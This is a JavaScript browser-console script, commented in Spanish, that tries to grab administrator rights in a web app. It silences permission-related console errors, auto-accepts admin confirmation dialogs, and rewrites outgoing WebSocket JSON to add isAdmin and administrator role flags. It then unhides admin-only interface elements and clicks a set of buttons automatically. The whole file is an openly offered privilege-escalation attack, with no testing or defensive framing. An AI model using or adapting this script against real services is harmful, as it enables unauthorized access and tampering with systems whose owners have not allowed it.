// Interceptar todas las verificaciones de permisos
function hijackPermissionChecks() {
    console.log('🔓 Activando bypass de permisos...');
    
    // 1. Interceptar console.log para ver mensajes de error
    const originalConsole = console.log;
    console.log = function(...args) {
        if (args[0] && typeof args[0] === 'string') {
            if (args[0].includes('admin') || args[0].includes('permission') || args[0].includes('denied')) {
                console.warn('🚨 Detectado mensaje de permiso:', args);
                // Podemos intentar ocultar estos errores
                return;
            }
        }
        originalConsole.apply(console, args);
    };
    
    // 2. Sobrescribir funciones comunes de verificación
    const originalConfirm = window.confirm;
    window.confirm = function(message) {
        if (message && (message.includes('admin') || message.includes('Admin'))) {
            console.log('✅ Bypass confirmación admin');
            return true;
        }
        return originalConfirm(message);
    };
    
    // 3. Interceptar WebSocket messages
    if (window.WebSocket) {
        const OriginalWebSocket = window.WebSocket;
        window.WebSocket = function(...args) {
            const ws = new OriginalWebSocket(...args);
            
            const originalSend = ws.send;
            ws.send = function(data) {
                // Modificar mensajes que van al servidor
                if (typeof data === 'string') {
                    try {
                        const parsed = JSON.parse(data);
                        // Añadir flag de admin si existe
                        if (parsed.userId || parsed.user) {
                            parsed.isAdmin = true;
                            parsed.userRole = 'administrator';
                            data = JSON.stringify(parsed);
                        }
                    } catch(e) {}
                }
                return originalSend.call(this, data);
            };
            
            return ws;
        };
    }
    
    // 4. Crear función global para forzar admin
    window.forceAdminMode = function() {
        // Inyectar estilos para indicar modo admin
        const style = document.createElement('style');
        style.textContent = `
            .admin-mode-indicator {
                position: fixed;
                top: 10px;
                right: 10px;
                background: red;
                color: white;
                padding: 5px 10px;
                border-radius: 5px;
                z-index: 9999;
                font-weight: bold;
            }
            .sc-fyCZGR {
                border: 2px solid gold !important;
            }
        `;
        document.head.appendChild(style);
        
        // Añadir indicador visual
        const indicator = document.createElement('div');
        indicator.className = 'admin-mode-indicator';
        indicator.textContent = '🔓 ADMIN MODE';
        document.body.appendChild(indicator);
        
        console.log('🔥 Modo administrador forzado activado');
    };
    
    // 5. Intentar modificar la UI para mostrar opciones ocultas
    function showHiddenOptions() {
        // Buscar elementos ocultos por permisos
        const allElements = document.querySelectorAll('*');
        allElements.forEach(el => {
            const style = window.getComputedStyle(el);
            if (style.display === 'none' || style.visibility === 'hidden') {
                // Verificar si está relacionado con admin
                const text = el.textContent || el.innerText;
                if (text && (text.includes('Admin') || text.includes('admin'))) {
                    el.style.display = 'block';
                    el.style.visibility = 'visible';
                    el.style.opacity = '1';
                    console.log('👁️ Mostrando elemento oculto:', text.substring(0, 50));
                }
            }
        });
    }
    
    // Ejecutar
    window.forceAdminMode();
    showHiddenOptions();
    
    console.log('✅ Sistema de bypass activado');
    
    // Reintentar acciones
    setTimeout(() => {
        console.log('🔄 Reintentando acciones con permisos elevados...');
        document.querySelectorAll('.sc-fyCZGR').forEach((btn, i) => {
            setTimeout(() => {
                console.log(`🎯 Presionando botón ${i + 1}`);
                btn.click();
                // Forzar eventos adicionales
                const event = new MouseEvent('click', {
                    bubbles: true,
                    cancelable: true,
                    view: window
                });
                btn.dispatchEvent(event);
            }, i * 500);
        });
    }, 2000);
}

// Ejecutar el bypass
hijackPermissionChecks();
